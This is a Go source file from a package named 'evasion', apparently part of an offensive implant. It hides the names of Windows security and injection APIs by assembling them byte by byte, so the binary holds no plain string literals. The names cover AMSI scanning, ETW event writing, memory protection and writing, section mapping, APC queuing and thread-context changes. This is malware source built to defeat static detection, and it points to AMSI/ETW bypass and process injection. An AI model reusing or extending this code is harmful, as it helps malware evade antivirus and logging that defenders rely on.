//go:build windows
// +build windows

package evasion

// stackStr assembles a string from individual byte literals so the string
// never appears as a contiguous sequence in the binary's data section.
// garble -literals handles this automatically at compile time; this is a
// defence-in-depth fallback for non-garble builds.
func stackStr(b ...byte) string { return string(b) }

// Sensitive API/DLL names built from bytes — no string literal in .rodata.
func sAmsiDLL() string {
	return stackStr('a', 'm', 's', 'i', '.', 'd', 'l', 'l')
}
func sAmsiScanBuffer() string {
	return stackStr('A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r')
}
func sEtwEventWrite() string {
	return stackStr('E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e')
}
func sEtwEventWriteFull() string {
	return stackStr('E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 'F', 'u', 'l', 'l')
}
func sEtwEventWriteEx() string {
	return stackStr('E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 'E', 'x')
}
func sEtwEventWriteTransfer() string {
	return stackStr('E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'W', 'r', 'i', 't', 'e', 'T', 'r', 'a', 'n', 's', 'f', 'e', 'r')
}
func sEtwEventRegister() string {
	return stackStr('E', 't', 'w', 'E', 'v', 'e', 'n', 't', 'R', 'e', 'g', 'i', 's', 't', 'e', 'r')
}
func sAmsiOpenSession() string {
	return stackStr('A', 'm', 's', 'i', 'O', 'p', 'e', 'n', 'S', 'e', 's', 's', 'i', 'o', 'n')
}
func sNtdll() string {
	return stackStr('n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l')
}
func sKernel32() string {
	return stackStr('k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l')
}
func sVirtualProtect() string {
	return stackStr('V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't')
}
func sNtProtectVirtualMemory() string {
	return stackStr('N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y')
}
func sNtWriteVirtualMemory() string {
	return stackStr('N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y')
}
func sNtFlushInstructionCache() string {
	return stackStr('N', 't', 'F', 'l', 'u', 's', 'h', 'I', 'n', 's', 't', 'r', 'u', 'c', 't', 'i', 'o', 'n', 'C', 'a', 'c', 'h', 'e')
}
func sKernelBase() string {
	return stackStr('K', 'e', 'r', 'n', 'e', 'l', 'B', 'a', 's', 'e', '.', 'd', 'l', 'l')
}
func sNtCreateSection() string {
	return stackStr('N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n')
}
func sNtMapViewOfSection() string {
	return stackStr('N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n')
}
func sNtUnmapViewOfSection() string {
	return stackStr('N', 't', 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n')
}
func sNtQueueApcThread() string {
	return stackStr('N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd')
}
func sNtGetNextThread() string {
	return stackStr('N', 't', 'G', 'e', 't', 'N', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd')
}
func sNtResumeThread() string {
	return stackStr('N', 't', 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd')
}
func sNtWaitForSingleObject() string {
	return stackStr('N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't')
}
func sRtlCreateTimerQueue() string {
	return stackStr('R', 't', 'l', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'i', 'm', 'e', 'r', 'Q', 'u', 'e', 'u', 'e')
}
func sRtlCreateTimer() string {
	return stackStr('R', 't', 'l', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'i', 'm', 'e', 'r')
}
func sNtDuplicateObject() string {
	return stackStr('N', 't', 'D', 'u', 'p', 'l', 'i', 'c', 'a', 't', 'e', 'O', 'b', 'j', 'e', 'c', 't')
}
func sNtGetNextProcess() string {
	return stackStr('N', 't', 'G', 'e', 't', 'N', 'e', 'x', 't', 'P', 'r', 'o', 'c', 'e', 's', 's')
}
func sNtSuspendThread() string {
	return stackStr('N', 't', 'S', 'u', 's', 'p', 'e', 'n', 'd', 'T', 'h', 'r', 'e', 'a', 'd')
}
func sNtGetContextThread() string {
	return stackStr('N', 't', 'G', 'e', 't', 'C', 'o', 'n', 't', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd')
}
func sNtSetContextThread() string {
	return stackStr('N', 't', 'S', 'e', 't', 'C', 'o', 'n', 't', 'e', 'x', 't', 'T', 'h', 'r', 'e', 'a', 'd')
}
